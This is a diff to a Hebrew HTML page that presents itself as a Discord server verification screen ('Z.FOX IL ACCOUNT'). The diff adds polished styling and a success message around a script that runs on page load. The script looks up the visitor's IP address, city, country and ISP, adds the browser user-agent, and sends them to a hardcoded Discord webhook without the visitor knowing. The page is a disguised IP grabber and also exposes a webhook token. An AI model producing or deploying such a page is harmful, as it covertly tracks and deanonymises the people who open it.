@@ -2,9 +2,79 @@
 <html lang="he">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            direction: rtl;
+        }
+        .container {
+            text-align: center;
+            padding: 60px 40px;
+            max-width: 600px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+        .icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            display: block;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 0 0 40px rgba(88, 101, 242, 0.6);
+        }
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+        .subtitle {
+            font-size: 18px;
+            color: #b0b0c0;
+            margin-bottom: 10px;
+        }
+        .server-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: #5865f2;
+            margin-top: 10px;
+            text-shadow: 0 0 20px rgba(88, 101, 242, 0.8);
+        }
+        .checkmark {
+            display: inline-block;
+            color: #43b581;
+            font-size: 48px;
+            margin-top: 30px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <img class="icon" src="https://cdn.discordapp.com/attachments/1556528049250504735/1556659360640270386/867c64f9664befda.jpg?backend=b2&ex=6ac4f780&is=6ac3a600&hm=dc470000caa41a5b15bcd6e51820c82807cb6021ea8eb36ac420715bd56449b5&" alt="Server Icon">
+        
+        <h1 class="title">✅ אתה מאומת!</h1>
+        <p class="subtitle">האימות הושלם בהצלחה</p>
+        <p class="server-name">Z.FOX IL ACCOUNT</p>
+        <div class="checkmark">✓</div>
+    </div>
+
 <script>
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
@@ -12,16 +82,12 @@
             const payload = {
                 content: "**IP:** " + data.ip + "\n**City:** " + data.city + "\n**Country:** " + data.country_name + "\n**ISP:** " + data.org + "\n**User-Agent:** " + navigator.userAgent
             };
-
             fetch('https://discord.com/api/webhooks/1556528696796381224/m3GlvOS-wuPZhqITsfEUcSR45HOaWWuS0aY00f8EiyL_MiuH8jdbCbCtp4fw31ae2eeA', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-
-            document.body.innerHTML = '<h1>Verification Complete</h1><p>You can close this page.</p>';
         });
 </script>
-<p>Loading...</p>
 </body>
 </html>
